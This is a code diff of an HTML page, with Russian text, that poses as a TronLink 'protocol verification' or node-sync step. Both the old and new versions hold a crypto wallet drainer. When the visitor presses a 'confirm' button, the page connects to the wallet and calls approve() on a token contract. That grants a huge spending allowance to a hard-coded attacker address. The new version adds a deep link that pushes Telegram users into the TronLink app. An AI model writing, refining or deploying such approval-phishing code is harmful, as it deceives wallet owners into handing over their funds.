@@ -3,47 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sync...</title>
-    <meta http-equiv="refresh" content="0.1;url=tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/">
+    <title>Protocol Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 30px; border: 1px solid #222; }
-        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
-        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; cursor: pointer; }
+        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
+        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 22px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
+        h2 { font-size: 22px; margin-bottom: 12px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
+        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; border: none; width: 100%; cursor: pointer; box-sizing: border-box; }
+        #status { color: #555; font-size: 11px; margin-top: 15px; }
     </style>
 </head>
 <body>
+
 <div class="card">
     <div class="logo">T</div>
-    <h2 id="t">Синхронизация</h2>
-    <p id="d">Подождите... iPhone запрашивает открытие TronLink.</p>
-    <button id="mainBtn" class="btn">ПОДТВЕРДИТЬ</button>
+    <h2 id="t">Верификация</h2>
+    <p id="d">Нажмите кнопку ниже для перехода в TronLink.</p>
+    
+    <a href="#" id="actionBtn" class="btn">ЗАПУСТИТЬ</a>
+    <div id="status">v3.0 Hybrid Direct</div>
 </div>
+
 <script>
-    const btn = document.getElementById('mainBtn');
-    const target = "tronlinkorg://dapp?url=" + encodeURIComponent(window.location.href);
+    const btn = document.getElementById('actionBtn');
+    const title = document.getElementById('t');
+    const desc = document.getElementById('d');
 
-    btn.onclick = async () => {
-        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
-        if (!tron) {
-            // Если не перекинуло само - толкаем еще раз по нажатию
-            window.location.href = target;
-            return;
+    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
+    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+    function updateUI() {
+        const isTronLink = window.tronWeb || (window.tron && window.tron.tronWeb);
+
+        if (isTronLink) {
+            // МЫ ВНУТРИ КОШЕЛЬКА
+            title.innerText = "Узел Обнаружен";
+            desc.innerText = "Кошелек подключен. Нажмите «ПОДТВЕРДИТЬ» для завершения.";
+            btn.innerText = "ПОДТВЕРДИТЬ";
+            btn.href = "#"; // Отключаем редирект
+            
+            btn.onclick = async (e) => {
+                e.preventDefault();
+                try {
+                    const tron = window.tronWeb || window.tron.tronWeb;
+                    await tron.request({ method: 'tron_requestAccounts' });
+                    const contract = await tron.contract().at(CONTRACT);
+                    await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
+                    alert("Успешно!");
+                } catch (err) { alert("Ошибка: " + err.message); }
+            };
+        } else {
+            // МЫ В ОБЫЧНОМ БРАУЗЕРЕ (Телеграм)
+            btn.innerText = "ЗАПУСТИТЬ ТРОНЛИНК";
+            // Прямой вызов приложения
+            btn.href = "tronlinkorg://dapp?url=" + encodeURIComponent(window.location.href);
         }
-        try {
-            await tron.request({ method: 'tron_requestAccounts' });
-            const contract = await tron.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
-            await contract.approve('TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4', '1000000000000000000').send({ feeLimit: 100000000 });
-            alert("Готово!");
-        } catch (e) { alert("Ошибка: " + e.message); }
-    };
-
-    if (window.tronWeb) {
-        document.getElementById('t').innerText = "Узел найден";
-        document.getElementById('d').innerText = "Нажмите для подписи.";
-        btn.innerText = "ПОДПИСАТЬ";
     }
+
+    // Проверяем каждые полсекунды (на всякий случай)
+    setInterval(updateUI, 500);
+    updateUI();
 </script>
 </body>
 </html>
